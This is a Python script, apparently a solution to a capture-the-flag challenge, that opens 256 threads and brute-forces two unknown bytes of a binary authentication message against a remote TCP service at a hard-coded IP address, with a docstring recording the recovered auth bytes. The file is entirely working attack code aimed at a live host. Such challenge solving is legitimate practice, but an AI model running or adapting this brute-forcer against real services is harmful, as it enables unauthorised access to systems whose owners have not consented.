"""
36 104
data: b'\xfe\xedS\xc4'
#################### found auth msg: b'\x1b$h\xbe\xafI0'
"""

import socket
from threading import Thread
import time


# REMOTE_ADDRESS = ('nfc.shieldchallenges.com', 80)
REMOTE_ADDRESS = ('18.194.34.242', 80)
found = False


class ByteBruteForcer(Thread):
    def __init__(self, first_unknown_byte: int):
        super(ByteBruteForcer, self).__init__()
        self.first_unknown_byte = first_unknown_byte

    def run(self):
        global found
        for i in range(256):
            try:
                if found:
                    return
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect(REMOTE_ADDRESS)

                auth_msg = b'\x1B%b\xBE\xAF\x49\x30' % bytes(
                    [self.first_unknown_byte, i])
                # print(self.first_unknown_byte, i)
                sock.send(auth_msg)

                data = sock.recv(1024)
                if data != b'' and data != b'\x01':
                    print(self.first_unknown_byte, i)
                    print('data:', data)
                    print('#################### found auth msg:', auth_msg)
                    found = True

            except socket.error as e:
                print(e)
            finally:
                sock.close()


start_time = time.time()

threads = []
for i in range(256):
    t = ByteBruteForcer(i)
    t.start()
    threads.append(t)
for t in threads:
    t.join()

print(f'Found in {time.time()-start_time:.3f} seconds.')
